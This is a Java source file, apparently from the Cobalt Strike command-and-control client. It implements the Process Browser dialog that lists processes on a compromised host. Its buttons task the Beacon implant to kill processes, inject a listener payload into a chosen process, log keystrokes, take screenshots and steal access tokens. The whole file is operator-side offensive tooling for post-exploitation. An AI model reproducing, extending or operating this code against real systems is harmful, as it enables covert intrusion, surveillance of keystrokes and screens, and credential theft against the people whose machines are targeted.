package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.dialogs.ListenerChooser;
import beacon.TaskBeacon;
import common.AObject;
import common.Callback;
import common.CommonUtils;
import common.ScriptUtils;
import dialog.DialogUtils;
import dialog.SafeDialogs;
import sleep.runtime.Scalar;
import ui.ATable;
import ui.GenericTableModel;
import ui.TablePopup;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Stack;

public class ProcessBrowser
        extends AObject implements Callback,
        ActionListener,
        TablePopup {
    protected String bid;
    protected AggressorClient client;
    protected GenericTableModel model;
    protected ATable table = null;
    protected String[] cols = new String[]{"PID", "PPID", "Name", "Arch", "Session", "User"};

    public ProcessBrowser(AggressorClient client, String bid) {
        this.client = client;
        this.bid = bid;
        this.model = DialogUtils.setupModel("PID", this.cols, new LinkedList());
    }

    public void refresh() {
        this.client.getConnection().call("beacons.task_ps", CommonUtils.args(this.bid), this);
    }

    @Override
    public void actionPerformed(ActionEvent ev) {
        String command = ev.getActionCommand();
        if ("Kill".equals(command)) {
            Object[] pids = this.model.getSelectedValues(this.table);
            TaskBeacon tasker = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            for (Object pid : pids) {
                tasker.input("kill " + pid);
                tasker.Kill(Integer.parseInt(pid + ""));
            }
            tasker.Pause(500);
            this.refresh();
        } else if ("Refresh".equals(command)) {
            this.refresh();
        } else if ("Inject".equals(command)) {
            new ListenerChooser(this.client.getConnection(), this.client.getData(), r -> {
                TaskBeacon tasker = new TaskBeacon(ProcessBrowser.this.client, ProcessBrowser.this.client.getData(), ProcessBrowser.this.client.getConnection(), new String[]{ProcessBrowser.this.bid});
                Object[][] all = ProcessBrowser.this.model.getSelectedValuesFromColumns(ProcessBrowser.this.table, CommonUtils.toArray("PID, Arch"));
                for (Object[] anAll : all) {
                    int pid = Integer.parseInt(anAll[0] + "");
                    String arch = anAll[1] + "";
                    tasker.input("inject " + pid + " " + arch + " " + r);
                    tasker.Inject(pid, r, arch);
                }
            }).show();
        } else if ("Log Keystrokes".equals(command)) {
            TaskBeacon tasker = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            Object[][] all = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch"));
            for (Object[] anAll : all) {
                int pid = Integer.parseInt(anAll[0] + "");
                String arch = anAll[1] + "";
                tasker.input("keylogger " + pid + " " + arch);
                tasker.KeyLogger(pid, arch);
            }
            DialogUtils.showInfo("Tasked Beacon to log keystrokes");
        } else if ("Screenshot".equals(command)) {
            final TaskBeacon tasker = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            final Object[][] all = this.model.getSelectedValuesFromColumns(this.table, CommonUtils.toArray("PID, Arch"));
            SafeDialogs.ask("Take screenshots for X seconds:", "0", r -> {
                int time = CommonUtils.toNumber(r, 0);
                for (Object[] anAll : all) {
                    int pid = Integer.parseInt(anAll[0] + "");
                    String arch = anAll[1] + "";
                    tasker.input("screenshot " + pid + " " + arch + " " + time);
                    tasker.Screenshot(pid, arch, time);
                }
                DialogUtils.showInfo("Tasked Beacon to take screenshot");
            });
        } else if ("Steal Token".equals(command)) {
            Object[] pids = this.model.getSelectedValues(this.table);
            TaskBeacon tasker = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            for (Object pid : pids) {
                tasker.input("steal_token " + pid);
                tasker.StealToken(Integer.parseInt(pid + ""));
            }
            DialogUtils.showInfo("Tasked Beacon to steal a token");
        }
    }

    @Override
    public void showPopup(MouseEvent ev) {
        Stack<Scalar> args = new Stack<>();
        args.push(ScriptUtils.convertAll(this));
        args.push(ScriptUtils.convertAll(this.model.getSelectedRows(this.table)));
        args.push(ScriptUtils.convertAll(this.bid));
        this.client.getScriptEngine().getMenuBuilder().installMenu(ev, "processbrowser", args);
    }

    public JButton Button(String title) {
        JButton temp = new JButton(title);
        temp.addActionListener(this);
        return temp;
    }

    public JComponent getContent() {
        JPanel dialog = new JPanel();
        dialog.setLayout(new BorderLayout());
        this.table = DialogUtils.setupTable(this.model, this.cols, true);
        DialogUtils.setTableColumnWidths(this.table, DialogUtils.toMap("PID: 60, PPID: 60, Name: 180, Arch: 60, Session: 60, User: 180"));
        this.table.setPopupMenu(this);
        JButton kill = this.Button("Kill");
        JButton refresh = this.Button("Refresh");
        JSeparator s1 = new JSeparator();
        JButton inject = this.Button("Inject");
        JButton logks = this.Button("Log Keystrokes");
        JButton screens = this.Button("Screenshot");
        JButton stealt = this.Button("Steal Token");
        JSeparator s2 = new JSeparator();
        JButton help = this.Button("Help");
        help.addActionListener(DialogUtils.gotoURL("https://www.cobaltstrike.com/help-process-browser"));
        dialog.add(DialogUtils.FilterAndScroll(this.table), "Center");
        dialog.add(DialogUtils.center(kill, refresh, s1, inject, logks, screens, stealt, s2, help), "South");
        this.refresh();
        return dialog;
    }

    @Override
    public void result(String key, Object o) {
        LinkedList results = new LinkedList();
        String[] rows = o.toString().trim().split("\n");
        for (String row : rows) {
            String[] cols = row.split("\t");
            HashMap<String, String> next = new HashMap<>();
            if (cols.length >= 1) {
                next.put("Name", cols[0]);
            }
            if (cols.length >= 2) {
                next.put("PPID", cols[1]);
            }
            if (cols.length >= 3) {
                next.put("PID", cols[2]);
            }
            if (cols.length >= 4) {
                next.put("Arch", cols[3]);
            }
            if (cols.length >= 5) {
                next.put("User", cols[4]);
            }
            if (cols.length >= 6) {
                next.put("Session", cols[5]);
            }
            results.add(next);
        }
        DialogUtils.setTable(this.table, this.model, results);
    }

}

